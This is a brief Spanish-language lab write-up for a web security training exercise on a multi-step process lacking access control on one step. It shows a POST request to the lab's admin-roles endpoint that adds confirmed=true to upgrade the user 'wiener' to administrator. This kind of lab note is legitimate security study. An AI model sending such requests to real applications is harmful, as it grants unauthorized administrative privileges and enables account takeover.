---
title: "12 - Multi-step process with no access control on one step"
---

# 12 - Multi-step process with no access control on one step

Lo mismo pero ahora hacemos un post añadiendo `confirmed=true`
Porque parece ser que en ese paso no verifican la autenticación

```
POST https://0a4a00fc0337e1dd81d4aca800cb00d5.web-security-academy.net/admin-roles

action=upgrade&confirmed=true&username=wiener
```
